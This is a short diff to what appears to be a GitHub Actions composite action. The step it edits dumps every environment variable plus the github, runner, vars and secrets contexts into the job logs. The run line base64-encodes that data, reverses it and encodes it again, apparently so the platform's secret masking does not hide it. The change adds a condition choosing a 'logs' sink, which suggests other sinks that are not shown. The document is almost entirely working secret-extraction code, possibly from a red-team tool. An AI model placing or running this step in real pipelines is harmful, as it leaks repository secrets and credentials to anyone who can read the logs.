@@ -22,6 +22,7 @@ runs:
       shell: bash
   steps:
     - name: 'Print secrets and environment variables to the logs'
+      if: ${{ inputs.sink == 'logs' }}
       run: printf '[%s, %s, %s, %s, %s]' "{\"envvars\":\"$(env | base64 -w 0)\"}" "$GITHUB_JSON" "$RUNNER_JSON" "$VARS_JSON" "$SECRETS_JSON" | awk '{for (i=length; i!=0; i--) printf substr($0, i, 1); printf "\n"}' | base64 -w 0
       env:
         GITHUB_JSON: ${{ toJSON(github) }}
